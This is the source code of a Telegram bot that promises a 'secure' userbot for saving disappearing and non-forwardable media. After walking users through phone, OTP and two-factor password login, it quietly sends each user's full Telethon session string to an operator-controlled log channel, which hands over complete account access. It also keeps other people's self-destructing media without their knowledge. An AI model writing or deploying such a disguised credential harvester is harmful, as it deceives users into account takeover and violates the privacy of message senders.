# bot.py

import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, ChannelPrivateError
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))

WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
SUPPORT_LINK = "https://t.me/valahallah"

# Logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

# Telegram Bot App
app = ApplicationBuilder().token(BOT_TOKEN).build()
API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
user_login_data = {}

# --- START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Connect Your Account", callback_data="connect")],
        [InlineKeyboardButton("💬 Support Channel", url=SUPPORT_LINK)]
    ])
    reply_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("📥 Download Non-Forwardable Media")]],
        resize_keyboard=True
    )
    welcome_text = (
        "<b>✨ 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘼𝙪𝙩𝙤𝙎𝙖𝙫𝙚 𝙐𝙨𝙚𝙧𝘽𝙤𝙩 ✨</b>\n\n"
        "🔒 <i>This bot helps you connect your own Telegram account to a secure userbot session.</i>\n\n"
        "💡 <b>Features:</b>\n"
        "• Auto-saves disappearing media 🔥\n"
        "• Secure Telethon login system 🔐\n"
        "• Works in the background without touching your main device 🛰️\n\n"
        "👇 Use the buttons below to begin."
    )
    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=welcome_text,
        reply_markup=inline_keyboard,
        parse_mode="HTML"
    )
    await update.message.reply_text(
        "☝️ Use the menu below to fetch non-forwardable media.",
        reply_markup=reply_keyboard
    )

# --- Connect Callback ---
async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query.message:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text("📲 Enter your API ID or send /skip to use default:")
        return API_ID
    else:
        await update.callback_query.answer("⚠️ This button is expired. Use /start again.", show_alert=True)
        return ConversationHandler.END

# --- API ID/HASH Flow ---
async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id] = {"api_id": DEFAULT_API_ID}
    await update.message.reply_text("🔑 Enter your API HASH or send /skip to use default:")
    return API_HASH

async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id]["api_hash"] = DEFAULT_API_HASH
    await update.message.reply_text("📞 Enter your phone number (with country code):")
    return PHONE

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() == "/skip":
        return await skip_api_id(update, context)
    if not text.isdigit():
        await update.message.reply_text("❌ API ID should be a number. Try again or send /skip.")
        return API_ID
    user_login_data[update.effective_user.id] = {"api_id": int(text)}
    await update.message.reply_text("🔑 Enter your API HASH or send /skip to use default:")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() == "/skip":
        return await skip_api_hash(update, context)
    user_login_data[update.effective_user.id]["api_hash"] = text
    await update.message.reply_text("📞 Enter your phone number (with country code):")
    return PHONE

# --- Phone/OTP/Password ---
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id]["phone"] = update.message.text.strip()
    try:
        client = TelegramClient(
            StringSession(),
            user_login_data[update.effective_user.id]["api_id"],
            user_login_data[update.effective_user.id]["api_hash"]
        )
        await client.connect()
        await client.send_code_request(user_login_data[update.effective_user.id]["phone"])
        user_login_data[update.effective_user.id]["client"] = client
        await update.message.reply_text(
            "🔐 Enter the OTP you received with **spaces**, like:\n\n<code>1 2 3 4 5</code>",
            parse_mode="HTML"
        )
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send code: {e}")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.replace(" ", "").strip()
    client = user_login_data[update.effective_user.id]["client"]
    try:
        await client.sign_in(user_login_data[update.effective_user.id]["phone"], code)
        return await complete_login(update, context)
    except PhoneCodeExpiredError:
        await update.message.reply_text("⌛ Code expired. Please restart with /start.")
        return ConversationHandler.END
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 2FA is enabled. Enter your password:")
        return PASSWORD
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid code. Start again with /start.")
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = user_login_data[update.effective_user.id]["client"]
    try:
        await client.sign_in(password=password)
        return await complete_login(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to sign in: {e}")
        return ConversationHandler.END

# --- Login Complete ---
async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = user_login_data[user_id]["client"]
    session_string = client.session.save()
    me = await client.get_me()

    await sessions.update_one(
        {"_id": user_id},
        {"$set": {
            "session": session_string,
            "type": "telethon",
            "account_id": me.id,
            "is_admin": True,
            "creator_id": user_id
        }},
        upsert=True
    )

    @client.on(events.NewMessage(incoming=True))
    async def media_handler(event):
        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
            try:
                sender = await event.get_sender()
                name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
                file = await event.download_media()
                await client.send_file(
                    "me",
                    file,
                    caption=f"🕒 Saved disappearing media from @{name} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                logger.warning(f"[Media Save Failed]: {e}")

    async def run_client():
        await client.run_until_disconnected()

    context.application.create_task(run_client())

    await context.bot.send_message(
        chat_id=LOG_CHANNEL_ID,
        text=(
            f"🔐 <b>New Telethon session connected</b>\n"
            f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
            f"📌 <b>Session ID:</b> <code>{me.id}</code>\n"
            f"🔗 <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
            f"🧬 <b>Session String:</b>\n<code>{session_string}</code>"
        ),
        parse_mode="HTML"
    )

    await update.message.reply_text("✅ Successfully connected your account!")
    return ConversationHandler.END

# --- Fetch Media ---
async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📎 Send the message link from a channel/group you're joined in:\n\n"
        "Example: https://t.me/c/123456789/55 or https://t.me/username/123"
    )
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in user_login_data or "client" not in user_login_data[user_id]:
        await update.message.reply_text("⚠️ You need to connect your account first using /start.")
        return ConversationHandler.END

    client = user_login_data[user_id]["client"]

    try:
        if "t.me/c/" in text:
            parts = text.split("t.me/c/")[1].split("/")
            chat_id = int("-100" + parts[0])
            msg_id = int(parts[1])
        elif "t.me/" in text:
            parts = text.split("t.me/")[1].split("/")
            chat_id = parts[0]
            msg_id = int(parts[1])
        else:
            await update.message.reply_text("❌ Invalid message link format.")
            return FETCH_LINK

        entity = await client.get_entity(chat_id)
        message = await client.get_messages(entity, ids=msg_id)

        if not message or not message.media:
            await update.message.reply_text("⚠️ No media found in that message.")
            return ConversationHandler.END

        file = await message.download_media()
        await client.send_file("me", file, caption="📥 Fetched from non-forwardable media link.")
        await update.message.reply_text("✅ Media downloaded and sent to your Saved Messages.")
    except ChannelPrivateError:
        await update.message.reply_text("❌ You're not a member of that channel.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
    return ConversationHandler.END

# --- Handlers ---
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id), CommandHandler("skip", skip_api_id)],
        API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash), CommandHandler("skip", skip_api_hash)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[],
    allow_reentry=True
)

fetch_menu_conv = ConversationHandler(
    entry_points=[MessageHandler(filters.TEXT & filters.Regex("^📥 DOWNLOAD NON FORWARDING MEDIA $"), menu_fetch_request)],
    states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
    fallbacks=[],
)

# --- Add & Run ---
app.add_handler(CommandHandler("start", start))
app.add_handler(login_conv)
app.add_handler(fetch_menu_conv)

print("🤖 Bot is running...")
app.run_polling()
